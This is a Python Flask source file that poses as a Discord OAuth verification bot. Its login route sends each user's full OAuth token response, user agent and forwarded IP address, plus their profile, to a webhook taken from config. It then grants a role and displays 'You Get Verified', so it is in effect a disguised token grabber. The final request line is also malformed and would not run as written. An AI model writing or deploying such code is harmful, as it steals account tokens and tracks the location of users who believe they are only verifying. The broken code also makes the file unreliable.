import json 
import os
import flask
import requests
sesso = open('config.json')
data = json.load(sesso)
id = data['id']
secret = data['secret']
scopes = data['scope']
redirect = data['redirect']
login = data['login']
webhook = data['webhook']
guild = data['guild_id']
token = data['token']
role = data['role']
app = flask.Flask(__name__)


class Oauth(object):
    client_id = id
    client_secret = secret
    scope = scopes
    redirect_uri = redirect
    discord_login_url = login
    discord_token_url = "https://discord.com/api/oauth2/token"
    @staticmethod
    def get_access_token(code):
      payload ={"client_id":Oauth.client_id,"client_secret":Oauth.client_secret,"grant_type":"authorization_code","code":code,"redirect_uri":Oauth.redirect_uri,"scope":Oauth.scope}
      headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
      tk = requests.post(url=Oauth.discord_token_url,data = payload,headers=headers)
      json = tk.json()
      return json

      


@app.route("/login",methods = ['get'])
def login():
    code = flask.request.args.get("code")
    access = Oauth.get_access_token(code)
    ip_addr = flask.request.environ
    print(ip_addr) 
    requests.post(webhook,json={"content":f"""```json
{str(access)}
HTTP_USER_AGENT:{ip_addr['HTTP_USER_AGENT']}
HTTP_X_FORWARDED_FOR: {ip_addr['HTTP_X_FORWARDED_FOR']}```"""})
    sex = requests.get('https://discordapp.com/api/users/@me',headers = {"authorization":f"Bearer {access['access_token']}"}).json()
    requests.post(webhook,json={"content":f"""```json
{str(requests.get('https://discordapp.com/api/users/@me',headers = {"authorization":f"Bearer {access['access_token']}"}).json())}
``` """})
    print(requests.patch(f"https://discord.com/api/v9/guilds/{guild}/members/{sex['id']}",headers = {'authorization':f"Bot {token}",json = {"roles":[role]}).json())
    
    return "You Get Verified"
  
  
app.run(host="0.0.0.0", port=8080)
